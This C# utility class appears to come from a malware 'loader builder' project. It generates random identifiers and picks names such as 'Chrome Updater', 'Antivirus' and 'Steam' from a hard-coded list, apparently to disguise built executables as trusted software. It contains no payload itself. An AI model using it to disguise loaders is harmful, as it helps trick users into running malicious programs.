namespace GameOverLoaderBuilder.Tools
{
    #region Зависимости

    using System;
    using System.Collections.Generic;
    using System.Security.Cryptography;

    #endregion

    /*
        Created by r3xq1
        https://github.com/r3xq1/
        Telegram: https://t.me/r3xq1
    */

    public static class GenX
    {
        private static readonly char[] AvailableCharacters =
        {
           'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M',
           'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
           'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm',
           'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
           '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '-', '_'
        };

        private static readonly List<string> SpisokName = new List<string>
        {
           "Windows", "Microsoft", "Doom", "Boom", "Origin", "Unpacker", "Protector",
           "Utility", "Launcher", "CheatEngine", "Extra", "EsetKey", "Mega", "Gold",
           "KeyLoader", "Avast","UnionTech", "SpaceCloud", "GTA-RPLauncher", "BalTech", "Updater",
           "Paragon", "NeoSpy", "Sysinternals Procmon", "Loader", "Chat_Update", "NetToolS",
           "Software", "Prototype", "Downloader", "Soft", "Firefox", "Chrome Updater", "Opera",
           "AntiVM", "Antivirus", "Anti-Malware", "Free", "PCDoctor", "Launchy", "7-Zip", "WinRar",
           "HotKey", "Tunner", "Steam", "PointBlank", "Thief"
        };

        public static string Update
        {
            get
            {
                SpisokName?.Shuffle();
                return SpisokName[0];
            }
        }

        public static string GenerateIdentifier(int length)
        {
            char[] identifier = new char[length];
            byte[] randomData = new byte[length];
            using (var rng = new RNGCryptoServiceProvider()) rng?.GetBytes(randomData);
            for (int idx = 0; idx < identifier.Length; idx++)
                identifier[idx] = AvailableCharacters[randomData[idx] % AvailableCharacters.Length];
            return new string(identifier);
        }

        public static int Next(int max)
        {
            byte[] bytes = new byte[4];
            int sse = 0;
            try
            {
                using var rng = new RNGCryptoServiceProvider();
                rng.GetBytes(bytes);
                sse = int.MaxValue & BitConverter.ToInt32(bytes, 0);
                return sse % max;
            }
            catch (CryptographicException ce) 
            {
                return sse;
                throw new CryptographicException("Error: ", ce);
            }
        }
    }
}